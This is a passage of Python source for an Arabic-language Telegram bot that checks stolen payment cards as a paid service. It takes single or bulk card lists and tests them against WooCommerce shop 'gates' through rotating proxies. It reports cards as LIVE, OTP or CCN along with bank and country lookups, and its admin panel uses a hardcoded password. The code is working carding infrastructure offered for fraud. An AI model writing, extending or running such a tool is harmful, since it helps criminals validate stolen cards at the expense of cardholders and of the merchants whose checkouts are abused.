            "أو أرسل ملف `.txt` باسم يحتوى على `proxy` وكل سطر بروكسي.",
            parse_mode="Markdown")
        return
    valid = [p for p in args if ':' in p]
    if not valid:
        bot.send_message(message.chat.id, "❌ صيغة خاطئة. المطلوب: `ip:port`", parse_mode="Markdown")
        return
    m = bot.send_message(message.chat.id, f"🔍 جارى التحقق من {len(valid)} بروكسي...")
    def _check_and_add():
        working = add_proxies_to_pool(valid)
        bot.edit_message_text(
            f"✅ تمت إضافة *{len(working)}* من أصل *{len(valid)}* بروكسي شغال.",
            message.chat.id, m.message_id, parse_mode="Markdown"
        )
    threading.Thread(target=_check_and_add).start()

# ═══════════════════════════════════════
# /status (أدمن)
# ═══════════════════════════════════════
@bot.message_handler(commands=['status'])
def cmd_status(message):
    if message.from_user.id != ADMIN_ID:
        return
    a, b, d = proxy_pool.get_stats()
    bot.reply_to(
        message,
        f"📊 *حالة البروكسيات:*\n🟢 نشط: {a}\n🟡 محظور: {b}\n🔴 ميت: {d}",
        parse_mode="Markdown"
    )

# ═══════════════════════════════════════
# /test (أدمن) — تشخيص البوابات
# ═══════════════════════════════════════
@bot.message_handler(commands=['test'])
def cmd_test(message):
    if message.from_user.id != ADMIN_ID:
        return
    m = bot.reply_to(message, "🔍 جارى اختبار البوابات...")
    threading.Thread(target=_run_gate_test,
                     args=(message.chat.id, m.message_id)).start()

def _run_gate_test(chat_id, msg_id):
    lines = ["🔍 *تشخيص البوابات*", "━━━━━━━━━━━━━━━━━━━━━━"]
    for gid, info in GATES.items():
        site = info['site']
        try:
            r = requests.get(f"{site}/my-account/", timeout=25,
                             headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'})
            has_reg = bool(re.search(r'name="woocommerce-register-nonce" value="(.*?)"', r.text))
            if r.status_code != 200:
                lines.append(f"{info['name']}: 🔴 HTTP {r.status_code}")
            elif not has_reg:
                lines.append(f"{info['name']}: 🟡 يعمل لكن نموذج التسجيل مفقود")
            else:
                lines.append(f"{info['name']}: 🟢 سليم")
        except Exception as e:
            lines.append(f"{info['name']}: 🔴 {type(e).__name__}")
    a, b, d = proxy_pool.get_stats()
    lines += ["━━━━━━━━━━━━━━━━━━━━━━",
              f"📡 بروكسي — 🟢 {a} | 🟡 {b} | 🔴 {d}"]
    if a == 0:
        lines.append("⚠️ _لا يوجد بروكسي نشط — الفحص يعمل مباشرة_")
    try:
        bot.edit_message_text("\n".join(lines), chat_id, msg_id, parse_mode="Markdown")
    except Exception as e:
        logger.error(f"gate test error: {e}")

# ═══════════════════════════════════════
# /gate (backward compat)
# ═══════════════════════════════════════
@bot.message_handler(commands=['gate'])
def cmd_gate(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    try:
        bot.delete_message(chat_id, message.message_id)
    except:
        pass
    if not is_subscription_active(user_id):
        edit_banner(user_id, chat_id,
                    "⛔ *اشتراكك غير نشط!*\n\nاستخدم 🎫 *كود تفعيل*.",
                    back_kb())
        return
    edit_banner(user_id, chat_id,
                "💳 *اختر البوابة* 👇",
                gates_kb('single'))

# ═══════════════════════════════════════
# /admin (لوحة الإدارة)
# ═══════════════════════════════════════
@bot.message_handler(commands=['admin'])
def cmd_admin(message):
    user_id = message.from_user.id
    if user_id != ADMIN_ID:
        return
    try:
        bot.delete_message(message.chat.id, message.message_id)
    except:
        pass
    bot.send_message(user_id, "🔐 *لوحة الإدارة*\nأرسل كلمة المرور:", parse_mode="Markdown")
    admin_session[user_id] = 'awaiting_password'

# ═══════════════════════════════════════
# معالجات حالة الأدمن (يجب قبل handle_text)
# ═══════════════════════════════════════
@bot.message_handler(func=lambda m: admin_session.get(m.from_user.id) == 'awaiting_password')
def admin_check_pw(message):
    user_id = message.from_user.id
    if user_id != ADMIN_ID:
        admin_session.pop(user_id, None)
        return
    if message.text.strip() == "Nemo@1986":
        admin_session[user_id] = 'authenticated'
        show_admin_menu(user_id)
    else:
        bot.send_message(user_id, "❌ كلمة المرور خاطئة.")
        admin_session.pop(user_id, None)

@bot.message_handler(func=lambda m: admin_session.get(m.from_user.id) == 'awaiting_days')
def admin_create_days(message):
    user_id = message.from_user.id
    if user_id != ADMIN_ID:
        admin_session.pop(user_id, None)
        return
    try:
        days = int(message.text.strip())
        if days <= 0:
            raise ValueError
        code = generate_redeem_code(user_id, days)
        bot.send_message(
            user_id,
            f"✅ *تم إنشاء الكود:*\n📌 `{code}`\n📅 المدة: {days} يوم",
            parse_mode="Markdown"
        )
    except:
        bot.send_message(user_id, "❌ أرسل رقماً موجباً فقط.")
    admin_session[user_id] = 'authenticated'
    show_admin_menu(user_id)

@bot.message_handler(func=lambda m: admin_session.get(m.from_user.id) == 'awaiting_revoke')
def admin_revoke_input(message):
    user_id = message.from_user.id
    if user_id != ADMIN_ID:
        admin_session.pop(user_id, None)
        return
    code = message.text.strip()
    if revoke_code(code):
        bot.send_message(user_id, f"✅ تم إلغاء الكود `{code}` بنجاح.")
    else:
        bot.send_message(user_id, "❌ فشل إلغاء الكود (غير موجود أو مستخدم).")
    admin_session[user_id] = 'authenticated'
    show_admin_menu(user_id)

# ═══════════════════════════════════════
# معالج الملفات
# ═══════════════════════════════════════
@bot.message_handler(content_types=['document'])
def handle_doc(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    state   = user_session_state.get(user_id)

    try:
        bot.delete_message(chat_id, message.message_id)
    except:
        pass

    if not is_subscription_active(user_id):
        edit_banner(user_id, chat_id, "⛔ *اشتراكك غير نشط!*", back_kb())
        return

    try:
        file_info = bot.get_file(message.document.file_id)
        content   = bot.download_file(file_info.file_path).decode('utf-8', errors='ignore')
        filename  = message.document.file_name.lower()
    except Exception as e:
        edit_banner(user_id, chat_id, f"❌ خطأ في تحميل الملف: {e}", back_kb())
        return

    if "proxy" in filename:
        proxies = [p.strip() for p in content.splitlines() if p.strip() and ':' in p]
        if proxies:
            threading.Thread(target=add_proxies_to_pool, args=(proxies,)).start()
            edit_banner(user_id, chat_id,
                        f"📡 *جارى إضافة {len(proxies)} بروكسي...*",
                        back_kb())
        else:
            edit_banner(user_id, chat_id,
                        "❌ *لا توجد بروكسيات صالحة في الملف.*", back_kb())
        return

    if state == 'awaiting_bulk_cards':
        cards = extract_cards(content)
        if cards:
            user_session_state.pop(user_id, None)
            gate_id = user_gate_choice.get(user_id, '1')
            mid     = user_main_message.get(user_id)
            threading.Thread(
                target=check_bulk_ui,
                args=(cards, chat_id, user_id, gate_id, mid)
            ).start()
        else:
            edit_banner(user_id, chat_id, CARD_FORMAT_HELP, back_kb())
    else:
        edit_banner(user_id, chat_id,
                    "❌ *اختر البوابة أولاً من القائمة الرئيسية.*",
                    back_kb())

# ═══════════════════════════════════════
# معالج النصوص العام (يجب أن يكون الأخير)
# ═══════════════════════════════════════
@bot.message_handler(func=lambda m: True)
def handle_text(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    state   = user_session_state.get(user_id)
    text    = message.text.strip() if message.text else ''

    try:
        bot.delete_message(chat_id, message.message_id)
    except:
        pass

    # ─── كود التفعيل ───
    if state == 'awaiting_redeem_code':
        user_session_state.pop(user_id, None)
        ok, msg_text = redeem_code(user_id, text)
        icon = "✅" if ok else "❌"
        edit_banner(
            user_id, chat_id,
            f"{icon} *نتيجة التفعيل*\n\n━━━━━━━━━━━━━━━━━━━━━━\n{msg_text}\n━━━━━━━━━━━━━━━━━━━━━━",
            back_kb()
        )
        return

    # ─── كارت واحد ───
    if state == 'awaiting_single_card':
        card = normalize_card(text)
        if card:
            user_session_state.pop(user_id, None)
            gate_id = user_gate_choice.get(user_id, '1')
            mid     = user_main_message.get(user_id)
            threading.Thread(
                target=check_single_ui,
                args=(card, chat_id, user_id, gate_id, mid)
            ).start()
        else:
            edit_banner(user_id, chat_id, CARD_FORMAT_HELP, back_kb())
        return

    # ─── مجموعة كروت ───
    if state == 'awaiting_bulk_cards':
        cards = extract_cards(text)
        if cards:
            user_session_state.pop(user_id, None)
            gate_id = user_gate_choice.get(user_id, '1')
            mid     = user_main_message.get(user_id)
            threading.Thread(
                target=check_bulk_ui,
                args=(cards, chat_id, user_id, gate_id, mid)
            ).start()
        else:
            edit_banner(user_id, chat_id, CARD_FORMAT_HELP, back_kb())
        return

    # ─── افتراضي: القائمة الرئيسية ───
    mid = user_main_message.get(user_id)
    if mid:
        edit_banner(user_id, chat_id, MAIN_CAPTION, main_menu_kb())
    else:
        send_banner(chat_id, user_id, MAIN_CAPTION, main_menu_kb())

# ═══════════════════════════════════════
# Callback: القائمة الرئيسية
# ═══════════════════════════════════════
@bot.callback_query_handler(func=lambda c: c.data == "main_menu")
def cb_main_menu(call):
    user_id = call.from_user.id
    chat_id = call.message.chat.id
    mid     = call.message.message_id
    user_session_state.pop(user_id, None)
    user_main_message[user_id] = mid
    edit_banner(user_id, chat_id, MAIN_CAPTION, main_menu_kb(), msg_id=mid)
    bot.answer_callback_query(call.id)

# ═══════════════════════════════════════
# Callback: فحص كارت واحد
# ═══════════════════════════════════════
@bot.callback_query_handler(func=lambda c: c.data == "menu_single")
def cb_menu_single(call):
    user_id = call.from_user.id
    chat_id = call.message.chat.id
    mid     = call.message.message_id
    user_main_message[user_id] = mid
    bot.answer_callback_query(call.id)

    if not is_subscription_active(user_id):
        edit_banner(user_id, chat_id,
                    "⛔ *اشتراكك غير نشط!*\n\nاستخدم 🎫 *كود تفعيل* للاشتراك.",
                    back_kb(), msg_id=mid)
        return

    edit_banner(user_id, chat_id,
                "💳 *فحص كارت واحد*\n\n━━━━━━━━━━━━━━━━━━━━━━\n"
                "اختر البوابة 👇",
                gates_kb('single'), msg_id=mid)

# ═══════════════════════════════════════
# Callback: فحص مجموعة
# ═══════════════════════════════════════
@bot.callback_query_handler(func=lambda c: c.data == "menu_bulk")
def cb_menu_bulk(call):
    user_id = call.from_user.id
    chat_id = call.message.chat.id
    mid     = call.message.message_id
    user_main_message[user_id] = mid
    bot.answer_callback_query(call.id)

    if not is_subscription_active(user_id):
        edit_banner(user_id, chat_id,
                    "⛔ *اشتراكك غير نشط!*\n\nاستخدم 🎫 *كود تفعيل* للاشتراك.",
                    back_kb(), msg_id=mid)
        return

    edit_banner(user_id, chat_id,
                "📋 *فحص مجموعة كروت*\n\n━━━━━━━━━━━━━━━━━━━━━━\n"
                "اختر البوابة 👇",
                gates_kb('bulk'), msg_id=mid)

# ═══════════════════════════════════════
# Callback: حسابى
# ═══════════════════════════════════════
@bot.callback_query_handler(func=lambda c: c.data == "menu_account")
def cb_menu_account(call):
    user_id = call.from_user.id
    chat_id = call.message.chat.id
    mid     = call.message.message_id
    user_main_message[user_id] = mid
    bot.answer_callback_query(call.id)

    status_text, expire = get_subscription_info(user_id)
    cap = (
        "👤 *حسابى*\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🆔 المعرف: `{user_id}`\n"
        f"📊 الحالة: {status_text}\n"
    )
    if expire:
        cap += f"📅 الانتهاء: `{expire}`\n"
    cap += "━━━━━━━━━━━━━━━━━━━━━━"

    edit_banner(user_id, chat_id, cap, back_kb(), msg_id=mid)

# ═══════════════════════════════════════
# Callback: كود تفعيل
# ═══════════════════════════════════════
@bot.callback_query_handler(func=lambda c: c.data == "menu_redeem")
def cb_menu_redeem(call):
    user_id = call.from_user.id
    chat_id = call.message.chat.id
    mid     = call.message.message_id
    user_main_message[user_id] = mid
    bot.answer_callback_query(call.id)

    user_session_state[user_id] = 'awaiting_redeem_code'
    edit_banner(
        user_id, chat_id,
        "🎫 *كود التفعيل*\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        "📩 أرسل كود التفعيل الخاص بك\n"
        "_مثال: ABCD1234EFGH_",
        back_kb(), msg_id=mid
    )

# ═══════════════════════════════════════
# Callback: اختيار البوابة
# ═══════════════════════════════════════
@bot.callback_query_handler(func=lambda c: c.data.startswith('gate_'))
def cb_gate(call):
    user_id = call.from_user.id
    chat_id = call.message.chat.id
    mid     = call.message.message_id
    user_main_message[user_id] = mid
    bot.answer_callback_query(call.id)

    parts   = call.data.split('_')  # gate_1_single
    gate_id = parts[1]
    mode    = parts[2] if len(parts) > 2 else 'single'

    user_gate_choice[user_id] = gate_id
    gate_name = GATES[gate_id]['name']

    if mode == 'single':
        user_session_state[user_id] = 'awaiting_single_card'
        cap = (
            f"✅ *تم اختيار {gate_name}*\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "📝 أرسل بيانات الكارت بأى صيغة:\n"
            "`4111111111111111|12|25|123`\n"
            "`4111111111111111:12:25:123`\n"
            "`4111111111111111 12 25 123`\n"
            "`4111-1111-1111-1111/12/25/123`\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "_البوت يتعرف على أى فاصل تلقائياً_ ✨"
        )
    else:
        user_session_state[user_id] = 'awaiting_bulk_cards'
        cap = (
            f"✅ *تم اختيار {gate_name}*\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "📝 أرسل الكروت (سطر لكل كارت)\n"
            "بأى فاصل: `|` `:` `/` `,` `-` أو مسافة\n\n"
            "📎 أو أرسل ملف `.txt`\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "_البوت يتعرف على أى فاصل تلقائياً_ ✨"
        )

    edit_banner(user_id, chat_id, cap, back_kb(), msg_id=mid)

# ═══════════════════════════════════════
# فحص كارت واحد (thread)
# ═══════════════════════════════════════
def check_single_ui(card_str, chat_id, user_id, gate_id, msg_id):
    gate_name = GATES[gate_id]['name']

    # رسالة الانتظار مع أنيميشن بسيط
    frames = ["⏳", "⌛"]
    for i in range(3):
        try:
            bot.edit_message_caption(
                caption=(
                    f"{frames[i%2]} *جارى الفحص...*\n\n"
                    f"🏦 البوابة: {gate_name}\n"
                    f"💳 `{card_str}`\n\n"
                    f"▶️▶️ يرجى الانتظار..."
                ),
                chat_id=chat_id, message_id=msg_id,
                reply_markup=types.InlineKeyboardMarkup(),
                parse_mode="Markdown"
            )
        except:
            pass
        time.sleep(0.6)

    status, reason = check_card_with_retry(card_str, GATES[gate_id]['site'])
    bin6    = card_str.split('|')[0][:6]
    bin_inf = get_bin_info(bin6)

    icon, label = STATUS_LABEL.get(status, ("❌", "DECLINED"))

    safe_reason = md_escape(reason)[:180] if reason else ""

    cap = (
        f"{icon} *{label}*\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"💳 `{card_str}`\n"
        f"🏦 البوابة: {gate_name}\n"
    )
    if safe_reason:
        cap += f"📄 الرد: _{safe_reason}_\n"
    cap += (
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🔢 BIN: `{bin6}`\n"
        f"🏛️ البنك: {bin_inf['bank']}\n"
        f"🌍 الدولة: {bin_inf['country']} {bin_inf['flag']}\n"
        f"💠 النوع: {bin_inf['brand']} ╱ {bin_inf['type']}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🔥 *CHECK BY: BaBa\\_MeDia* 🔥"
    )

    try:
        bot.edit_message_caption(
            caption=cap, chat_id=chat_id, message_id=msg_id,
            reply_markup=after_check_kb('single'), parse_mode="Markdown"
        )
    except Exception as e:
        logger.error(f"single card result error: {e}")

# ═══════════════════════════════════════
# فحص مجموعة كروت (thread) مع Progress Bar
# ═══════════════════════════════════════
def check_bulk_ui(cards, chat_id, user_id, gate_id, msg_id):
    total     = len(cards)
    gate_name = GATES[gate_id]['name']

    # حالة مشتركة بين الـ threads
    res  = {'passed': 0, 'otp': 0, 'live': 0, 'ccn': 0,
            'declined': 0, 'skipped': 0, 'done': 0}
    lock = threading.Lock()
    last_edit = [0.0]

    def push_progress():
        """تحديث شريط التقدم (معدل: كل 2.5 ثانية كحد أقصى)"""
        now = time.time()
        with lock:
            if now - last_edit[0] < 2.5 and res['done'] < total:
                return
            last_edit[0] = now
            done = res['done']
            snap = dict(res)

        bar = progress_bar(done, total)
        cap = (
            f"🔄 *جارى الفحص...*\n\n"
            f"🏦 البوابة: {gate_name}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"`{bar}`\n"
            f"📈 *{done} / {total}* كارت\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"✅ نجح: *{snap['passed']}*  |  ⚠️ OTP: *{snap['otp']}*\n"
            f"💚 LIVE: *{snap['live']}*  |  🟡 CCN: *{snap['ccn']}*\n"
            f"❌ رُفض: *{snap['declined']}*  |  🛠️ لم يُفحص: *{snap['skipped']}*"
        )
        try:
            bot.edit_message_caption(
                caption=cap, chat_id=chat_id, message_id=msg_id,
                reply_markup=types.InlineKeyboardMarkup(),
                parse_mode="Markdown"
            )
        except:
            pass

    # رسالة البداية
    push_progress()

    def process_one(card):
        status, reason = check_card_with_retry(card, GATES[gate_id]['site'])
        with lock:
            if status == "PASSED":
                res['passed'] += 1
            elif status == "OTP":
                res['otp'] += 1
            elif status == "LIVE":
                res['live'] += 1
            elif status == "CCN":
                res['ccn'] += 1
            elif status in INFRA_FAIL or status == "INVALID_FORMAT":
                res['skipped'] += 1
            else:
                res['declined'] += 1
            res['done'] += 1
        push_progress()

        # أرسل رسالة منفصلة للنتائج المهمة فقط
        if status in ("PASSED", "OTP", "LIVE", "CCN"):
            icon, label = STATUS_LABEL.get(status, ("✅", status))
            bin6    = card.split('|')[0][:6]
            bin_inf = get_bin_info(bin6)
            try:
                bot.send_message(
                    chat_id,
                    f"{icon} *{label}* | {gate_name}\n"
                    f"`{card}`\n"
                    f"📄 _{md_escape(reason)[:120]}_\n"
                    f"🏛️ {bin_inf['bank']} | {bin_inf['country']} {bin_inf['flag']}\n"
                    f"🔥 *BaBa\\_MeDia*",
                    parse_mode="Markdown"
                )
            except:
                pass
        return status

    # تشغيل متوازي (3 threads)
    with ThreadPoolExecutor(max_workers=3) as ex:
        futures = {ex.submit(process_one, card): card for card in cards}
        for future in as_completed(futures):
            try:
                future.result()
            except Exception as e:
                logger.error(f"bulk worker error: {e}")
                with lock:
                    res['skipped'] += 1
                    res['done']    += 1

    # ملخص نهائي
    cap = (
        f"🏁 *انتهى الفحص!*\n\n"
        f"🏦 البوابة: {gate_name}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"📦 الإجمالي: *{total}* كارت\n"
        f"✅ نجح:      *{res['passed']}*\n"
        f"⚠️ OTP:      *{res['otp']}*\n"
        f"💚 LIVE:     *{res['live']}*\n"
        f"🟡 CCN:      *{res['ccn']}*\n"
        f"❌ رُفض:     *{res['declined']}*\n"
        f"🛠️ لم يُفحص: *{res['skipped']}*\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
    )
    if res['skipped']:
        cap += ("⚠️ _الكروت التى لم تُفحص سببها البوابة أو البروكسي،_\n"
                "_وليست مرفوضة. أعد فحصها لاحقاً._\n"
                "━━━━━━━━━━━━━━━━━━━━━━\n")
    cap += f"🔥 *CHECK BY: BaBa\\_MeDia* 🔥"
    try:
        bot.edit_message_caption(
            caption=cap, chat_id=chat_id, message_id=msg_id,
            reply_markup=after_check_kb('bulk'), parse_mode="Markdown"
        )
    except Exception as e:
        logger.error(f"bulk summary error: {e}")

# ═══════════════════════════════════════
# لوحة الإدارة
# ═══════════════════════════════════════
def show_admin_menu(user_id):
    kb = types.InlineKeyboardMarkup(row_width=2)
    kb.add(
        btn("➕ إنشاء كود",       STYLE_SUCCESS, callback_data="admin_create_code"),
        btn("📋 عرض الأكواد",     STYLE_PRIMARY, callback_data="admin_view_codes"),
    )
    kb.add(
        btn("👥 عرض المستخدمين",  STYLE_PRIMARY, callback_data="admin_view_users"),
        btn("🗑️ إلغاء كود",       STYLE_DANGER,  callback_data="admin_revoke_code"),
    )
    kb.add(
        btn("📡 جلب بروكسيات",    STYLE_SUCCESS, callback_data="admin_fetch_proxies"),
        btn("📊 حالة البروكسيات", STYLE_PRIMARY, callback_data="admin_proxy_stats"),
    )
    kb.add(
        btn("🔍 تشخيص البوابات",  STYLE_PRIMARY, callback_data="admin_test_gates"),
        btn("❌ خروج",            STYLE_DANGER,  callback_data="admin_logout"),
    )
    bot.send_message(
        user_id,
        "🛠️ *لوحة إدارة البوت*\nاختر أحد الخيارات:",
        reply_markup=kb, parse_mode="Markdown"
    )

@bot.callback_query_handler(func=lambda c: c.data.startswith('admin_'))
def cb_admin(call):
    user_id = call.from_user.id
    if user_id != ADMIN_ID or admin_session.get(user_id) != 'authenticated':
        bot.answer_callback_query(call.id, "غير مصرح لك.")
        return

    data = call.data
    bot.answer_callback_query(call.id)

    if data == "admin_create_code":
        bot.send_message(user_id, "📅 أرسل عدد الأيام (رقم فقط):")
        admin_session[user_id] = 'awaiting_days'

    elif data == "admin_view_codes":
        codes = get_all_codes()
        if not codes:
            bot.send_message(user_id, "📭 لا توجد أكواد.")
            return
        msg = "📜 *قائمة الأكواد:*\n\n"
        for code, days, used_by, _, _ in codes[:30]:
            st = "✅ مستخدم" if used_by else "🟢 متاح"
            msg += f"`{code}` | {days}y | {st}\n"
        if len(codes) > 30:
            msg += f"\n... و {len(codes)-30} أخرى"
        bot.send_message(user_id, msg, parse_mode="Markdown")

    elif data == "admin_view_users":
        users = get_all_users()
        if not users:
            bot.send_message(user_id, "📭 لا يوجد مستخدمون.")
            return
        msg = "👥 *قائمة المستخدمين:*\n\n"
        for uid, end_str, _ in users[:50]:
            if uid == ADMIN_ID:
                continue
            if end_str:
                end_date  = datetime.fromisoformat(end_str)
                remaining = (end_date - datetime.now()).days
                st = f"✅ {remaining}d" if remaining >= 0 else "❌ منتهي"
            else:
                st = "❌ بدون"
            msg += f"🆔 `{uid}` | {st}\n"
        bot.send_message(user_id, msg, parse_mode="Markdown")

    elif data == "admin_revoke_code":
        bot.send_message(user_id, "✏️ أرسل الكود الذي تريد إلغاءه:")
        admin_session[user_id] = 'awaiting_revoke'

    elif data == "admin_fetch_proxies":
        bot.send_message(user_id, "📡 جاري سحب بروكسيات من GitHub...")
        threading.Thread(target=_fetch_and_add, args=(user_id,)).start()

    elif data == "admin_test_gates":
        m2 = bot.send_message(user_id, "🔍 جارى اختبار البوابات...")
        threading.Thread(target=_run_gate_test, args=(user_id, m2.message_id)).start()

    elif data == "admin_proxy_stats":
        a, b, d = proxy_pool.get_stats()
        bot.send_message(
            user_id,
            f"📊 *حالة البروكسيات:*\n🟢 نشط: {a}\n🟡 محظور: {b}\n🔴 ميت: {d}",
            parse_mode="Markdown"
        )

    elif data == "admin_logout":
        admin_session.pop(user_id, None)
        bot.send_message(user_id, "👋 تم تسجيل الخروج من لوحة الإدارة.")

def _fetch_and_add(user_id):
    proxies = fetch_proxies_from_github()
    if proxies:
        working = add_proxies_to_pool(proxies)
        bot.send_message(user_id, f"✅ تمت إضافة {len(working)} بروكسي شغال من GitHub.")
    else:
        bot.send_message(user_id, "❌ فشل سحب البروكسيات.")

# ═══════════════════════════════════════
# تشغيل البوت
# ═══════════════════════════════════════
def _startup_report():
    """يطبع محتوى قاعدة البيانات عند الإقلاع للتأكد أن البيانات لم تُفقد"""
    try:
        conn = db()
        c = conn.cursor()
        c.execute("SELECT COUNT(*) FROM users")
        users = c.fetchone()[0]
        c.execute("SELECT COUNT(*) FROM users WHERE subscription_end > ?",
                  (datetime.now().isoformat(),))
        active = c.fetchone()[0]
        c.execute("SELECT COUNT(*) FROM redeem_codes")
        codes = c.fetchone()[0]
        c.execute("SELECT COUNT(*) FROM redeem_codes WHERE used_by IS NULL")
        free_codes = c.fetchone()[0]
        c.execute("SELECT COUNT(*) FROM proxies")
        prox = c.fetchone()[0]
        conn.close()
        print(f"💾 مسار البيانات: {DATA_DIR}")
        print(f"👥 مستخدمين: {users} (اشتراك نشط: {active})")
        print(f"🎫 أكواد: {codes} (متاح: {free_codes})")
        print(f"📡 بروكسيات محفوظة: {prox}")
        try:
            import telebot.version as _tv
            print(f"📚 pyTelegramBotAPI: {_tv.__version__}")
        except Exception:
            pass
        if STYLE_SUPPORTED:
            print("🎨 ألوان الأزرار: مفعّلة (primary/success/danger)")
        else:
            print("🎨 ألوان الأزرار: غير مدعومة — حدّث المكتبة لـ 4.31.0+")
        if DATA_DIR == os.path.dirname(os.path.abspath(__file__)):
            print("⚠️ تحذير: البيانات مخزنة بجوار الكود.")
            print("   على Railway/Render اربط Volume واضبط DATA_DIR=/data")
            print("   وإلا ستُفقد الاشتراكات والبروكسيات عند كل إعادة نشر!")
    except Exception as e:
        print(f"⚠️ تعذر قراءة تقرير الإقلاع: {e}")

print("━" * 45)
print("✅ JAMAIKA CHECKER BOT v2.1 شغال!")
print("🔥 التوقيع: 𝕭𝖆𝕭𝖆_𝕸𝖊𝕯𝖎𝖆")
print(f"👤 الأدمن ID: {ADMIN_ID}")
_startup_report()
print("━" * 45)

# ────────────────────────────────────────────────
# Webhook Mode (Flask server for Railway)
# ────────────────────────────────────────────────
from flask import Flask, request

app = Flask(__name__)

@app.route('/webhook', methods=['POST'])
def webhook():
    ct = request.headers.get('content-type', '')
    logger.info(f"[webhook] POST received | content-type={ct!r} | size={request.content_length}")
    if request.is_json or 'application/json' in ct:
        json_string = request.get_data().decode('utf-8')
        update = telebot.types.Update.de_json(json_string)
        bot.process_new_updates([update])
        return '', 200
    logger.warning(f"[webhook] Rejected request | content-type={ct!r}")
    return 'Invalid request', 400

@app.route('/health', methods=['GET'])
def health():
    try:
        me = bot.get_me()
        wh = bot.get_webhook_info()
        return {
            'status': 'ok',
            'bot': me.username,
            'webhook_url': wh.url,
            'pending_updates': wh.pending_update_count,
            'last_error': wh.last_error_message or 'none'
        }
    except Exception as e:
        return {'status': 'error', 'detail': str(e)}, 500

@app.route('/', methods=['GET'])
def index():
    return 'Bot is running', 200

# Set webhook on startup (only once, when deployed)
WEBHOOK_URL = os.environ.get('WEBHOOK_URL')
if WEBHOOK_URL:
    try:
        bot.remove_webhook()
        time.sleep(1)
        _base = WEBHOOK_URL.rstrip('/')
        if _base.endswith('/webhook'):
            _base = _base[:-8]
        # تأكد من وجود https://
        if not _base.startswith('http://') and not _base.startswith('https://'):
            _base = 'https://' + _base
        bot.set_webhook(url=f"{_base}/webhook")
        print(f"✅ Webhook set to: {_base}/webhook")
    except Exception as e:
        print(f"❌ Failed to set webhook: {e}")
else:
    print("⚠️ WEBHOOK_URL not set — bot will NOT receive updates!")
    print("   Set it in Railway Environment Variables (e.g., https://mybot.up.railway.app)")

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    print(f"🚀 Flask server listening on 0.0.0.0:{port}")
    app.run(host='0.0.0.0', port=port)